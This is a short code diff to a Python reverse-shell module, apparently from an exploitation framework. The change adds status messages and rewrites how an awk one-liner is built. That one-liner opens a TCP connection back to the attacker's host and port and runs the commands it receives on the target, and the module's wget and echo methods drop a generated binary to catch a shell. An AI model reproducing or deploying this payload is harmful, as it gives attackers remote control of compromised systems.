@@ -114,6 +114,7 @@ class reverse_shell(object):
         server.server_close()
 
     def wget(self, binary, location):
+        print_status("Using wget method")
         # generate binary
         self.generate_binary(self.lhost, self.lport)
 
@@ -140,6 +141,8 @@ class reverse_shell(object):
         self.shell(sock)
 
     def echo(self, binary, location):
+        print_status("Using echo method")
+
         # generate binary
         self.generate_binary(self.lhost, self.lport)
         path = "{}/{}".format(location, self.binary_name)
@@ -166,9 +169,11 @@ class reverse_shell(object):
         self.shell(sock)
 
     def awk(self, binary):
+        print_status("Using awk method")
+
         # run reverse shell through awk
         sock = self.listen(self.lhost, self.lport)
-        cmd = "{} 'BEGIN{s=\"/inet/tcp/0/{}/{}\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'".format(binary, self.lhost, self.lport)
+        cmd = binary + " 'BEGIN{s=\"/inet/tcp/0/" + self.lhost + "/" + self.lport + "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'"
         self.exploit.execute(cmd)
 
         # waiting for shell
